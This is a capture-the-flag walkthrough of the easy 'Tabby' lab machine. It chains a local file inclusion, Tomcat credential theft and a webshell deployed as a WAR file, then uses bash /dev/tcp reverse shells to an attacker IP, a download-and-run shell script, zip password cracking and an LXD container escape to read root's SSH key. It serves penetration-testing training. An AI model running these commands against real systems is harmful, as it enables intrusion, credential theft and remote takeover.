@@ -1,0 +1,245 @@
+l
+
+                 Tabby
+
+                                                                 6th October 2020 / Document No D20.101.115
+                                                                 Prepared By: bertolis
+                                                                 Machine Author: egre55
+                                                                 Difficulty: Easy
+                                                                 Classification: Official
+Synopsis
+
+Tabby is a easy difficulty Linux machine. Enumeration of the website reveals a second website
+that is hosted on the same server under a different vhost. This website is vulnerable to Local File
+Inclusion. Knowledge of the OS version is used to identify the tomcat-users.xml file location.
+This file yields credentials for a Tomcat user that is authorized to use the /manager/text
+interface. This is leveraged to deploy of a war file and upload a webshell, which in turn is used to
+get a reverse shell. Enumeration of the filesystem reveals a password protected zip file, which can
+be downloaded and cracked locally. The cracked password can be used to login to the remote
+machine as a low privileged user. However this user is a member of the LXD group, which allows
+privilege escalation by creating a privileged container, into which the host's filesystem is
+mounted. Eventually, access to the remote machine is gained as root using SSH.
+
+Skills Required
+
+      Web Enumeration
+      Linux Enumeration
+
+Skills Learned
+
+      Tomcat Text Interface WAR File Upload
+      ZIP Cracking
+      LXD Abuse
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.188 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.188
+
+Nmap output reveals that this is a Ubuntu server, running SSH, Apache and Tomcat on their
+default ports. Let's enumerate the website titled "Mega Hosting".
+
+   http://10.10.10.194/
+
+This a website for a company that provides hosting services. Having a closer at the website, there
+is a link stating that the company has recently recovered from a data breach. The link points to
+http://megahosting.htb/news.php?file=statement . Let's add this domain name to the
+/etc/hosts file.
+
+   sudo -- sh -c "echo '10.10.10.194 megahosting.htb' >> /etc/hosts"
+Now let's click the link again.
+We notice that we are being redirected to http://megahosting.htb/news.php?file=statement .
+It's worth noting that statement seems to be a filename passed as input to the parameter file
+of the page news.php . Let's check if this is vulnerable to Local File Inclusion (LFI), by trying to load
+/etc/passwd .
+
+   http://megahosting.htb/news.php?file=/etc/passwd
+   http://megahosting.htb/news.php?file=../etc/passwd
+   http://megahosting.htb/news.php?file=../../etc/passwd
+   http://megahosting.htb/news.php?file=../../../etc/passwd
+   http://megahosting.htb/news.php?file=../../../../etc/passwd
+Of the above payloads, ../../../../etc/passwd was successful. We note that ash is a system
+user.
+Let's try to access Tomcat on port 8080.
+
+Scanning for hidden directories reveals the well-known Tomcat /manager page.
+
+This is a default page that allows users to manage web applications. Tomcat's manager page
+requires authentication.
+
+Attempting to log in with common credentials like admin / admin is not successful. However, if
+we click cancel we get a 401 Unauthorized message. This page reveals that the credentials are
+in the file conf/tomcat-users.xml .
+Let's search online for the default path of the Tomcat installation, in order to check if we can
+access it through the LFI vulnerability.
+
+According to the first result, and since our instance of tomcat is version 9, the default installation
+directory is /usr/local/tomcat9 . Let's combine these information and try to access
+conf/tomcat-users.xml from LFI vulnerability found earlier on Apache.
+
+   http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/conf/tomcat-
+   users.xml
+Clicking CTRL + U to view the page source doesn't show any text. Unfortunately this request
+returned a blank page. Let's check if the file tomcat-users.xml is located in a different path
+inside Tomcat's default installation directory.
+
+Clicking at the first result we can see the file structure of the directory /usr/share/tomcat9 .
+This reveals that Tomcat stores the tomcat-users.xml file in the directory
+/usr/share/tomcat9/etc . Let's try to access this file again. This time we can see the file
+contents in the HTML source code.
+
+   view-source:http://megahosting.htb/news.php?
+   file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
+The file is found to contain the credentials tomcat / $3cureP4s5w0rd123! . As the roles xml
+attribute shows that this user is a member of admin-gui and manager-script . The manager-gui
+role that allows access to the /manager page is not assigned.
+Foothold
+
+Let's scan this URL and see if there are any files or directories hosted there.
+   wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404
+   http://10.10.10.194:8080/manager/FUZZ
+
+Wfuzz reveals the above directories. We can search online for the /manager/text interface.
+
+This returns Tomcat's official documentation, which states that commands can be executed
+through this interface.
+As the Tomcat user is assigned the manager-script role, we should be permitted to interact with
+/manager/text . Let's try listing the available hosts on Tomcat.
+
+   USERNAME=tomcat
+   PASSWORD=\$3cureP4s5w0rd123!
+   curl -u ${USERNAME}:${PASSWORD} http://10.10.10.194:8080/manager/text/list
+
+This is successful. It is also well-known that Tomcat deploys Java web applications. Let's check if
+we can deploy a project using the text interface.
+Searching online reveals official Tomcat documentation explaining how this can be done.
+
+According to this, it is possible to create a war file and deploy it to the server. A war file is an
+archived Java application. Let's download a JSP webshell and create the war file. In order to
+create a war file we can use zip .
+
+   wget
+   https://gist.github.com/ErosLever/7445a3cfaaf80f1f5a53/archive/f14a53bd1095a387c
+   063466167d49c20bb94050a.zip
+   unzip f14a53bd1095a387c063466167d49c20bb94050a.zip
+   zip webshell.war 7445a3cfaaf80f1f5a53-
+   f14a53bd1095a387c063466167d49c20bb94050a/cmd.jsp
+
+Now that we've archived the webshell, let's specify the file we want to upload, set the application
+name to webshell and the update value to true , and try to deploy it.
+
+   SERNAME=tomcat
+   PASSWORD=\$3cureP4s5w0rd123!
+   curl -u ${USERNAME}:${PASSWORD} -T webshell.war
+   http://10.10.10.194:8080/manager/text/deploy?path=/webshell&update=true
+Setting the update parameter to true , makes sure that any existing project will be undeployed
+before the new deployment.
+The file was deployed successfully. Let's try to access it from the browser.
+   http://10.10.10.194:8080/webshell/cmd.jsp
+
+This is successful. We can execute commands on the remote machine as the user tomcat . Let's
+start a listener on our local machine.
+
+   nc -lvp 5555
+Then try to create a reverse shell, executing the following command from the webshell.
+
+   bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
+Getting a reverse shell using the above command didn't work. Let's create a reverse shell, start an
+HTTP server locally and download it to the remote machine.
+
+   echo "0<&196;exec 196<>/dev/tcp/10.10.14.3/5555; sh <&196 >&196 2>&196" > shell
+   php -S 0.0.0.0:8000
+
+From the webshell, input the following commands to download and run the script.
+   wget http://10.10.14.3:8000/shell-x64.elf -O /tmp/shell
+   chmod +x /tmp/shell
+   bash /tmp/shell
+
+This is successful and we receive a reverse shell. We can now spawn a PTY shell using Python3.
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+Lateral Movement
+
+Enumeration of the directories and files reveals the archive
+/var/www/html/16162020_backup.zip , that is owned by the user ash . Trying to unzip this file
+returns a message prompting for a password.
+
+We could download the zip file and try to crack the password locally. An easy way to do this is to
+get a base64-encoded representation of the zip file, and decode it back on our local machine. We
+use the -w0 option so that the output is returned in a continuous line.
+
+   base64 -w0 16162020_backup.zip
+
+Copy the output and issue the following command to recreate the zip file locally. Replace with
+your own output as appropriate.
+
+   echo "UEsDBAoAAAAAAIUDf0gAAAAAAAAAAAAAAAA<SNIP>" | base64 -d -w0 > backup.zip
+Now we can try to crack the zip file using fcrackzip in a dictionary attack using the
+rockyou.txt wordlist. We use the option -D to specify that this will be a dictionary attack, and -
+u to specify the unzip process.
+
+   fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+After some seconds, the password is found. Decompressing the backup.zip file using the
+password admin@it reveals some files and directories from the web application. Since this zip
+file is owned by user ash , let's try to login to the system using the credentials ash / admin@it .
+
+   su ash
+
+This is successful and we have gained access to the system as ash . The user flag is located in
+/home/ash/user.txt .
+Privilege Escalation
+
+Enumeration of the user reveals membership of the lxd group.
+
+The lxd (Linux Daemon) is a system container manager, that controls lxc (Linux Container).
+Linux Container (LXC) is a virtualization technology that runs isolated containers using a single
+Linux kernel. It is possible for the user ash to create a privileged container and then use it to
+mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it
+to the remote machine. Lets download and build the image locally. The image can be found here.
+
+   git clone https://github.com/saghul/lxd-alpine-builder.git
+   cd lxd-alpine-builder/
+   ./build-alpine
+
+A compressed file alpine-v3.12-x86_64-20201106_1855.tar.gz is created. Let's stand up an
+HTTP server.
+
+   php -S 0.0.0.0:8000
+
+Then download the file to the machine.
+   cd /home/ash
+   wget http://10.10.14.3:8000/alpine-v3.12-x86_64-20201106_2000.tar.gz
+
+On the remote machine, run the following to initiate lxd , inputting no to all prompts.
+   lxd init
+
+Next, we run the following command to import the alpine image.
+   lxc image import ./alpine-v3.12-x86_64-20201106_2000.tar.gz --alias alpine
+
+To check if the image is successfully imported, type the following.
+   lxc image list
+Next, we need to make the container privileged, and mount the filesystem, before starting the
+container.
+
+   lxc init alpine mycontainer -c security.privileged=true
+   lxc config device add mycontainer mydevice disk source=/ path=/mnt/root
+   recursive=true
+   lxc start mycontainer
+
+Once the container is started, we can access it by typing the following command.
+   lxc exec mycontainer /bin/sh
+
+The container has been created successfully and we have root access on it. Enumeration of
+/mnt/root reveals the private SSH key /root/.ssh/id_rsa . Use cat to display the contents.
+
+   cat /mnt/root/root/.ssh/id_rsa
+On our local machine, we create a new file.
+
+   vim id_rsa
+Then we paste the key and give the appropriate permissions to the file.
+
+   chmod 400 id_rsa
+Finally, we execute the following command to connect as root
+
+   ssh -i id_rsa root@10.10.10.194
+The root flag is located in /root/root.txt .
+
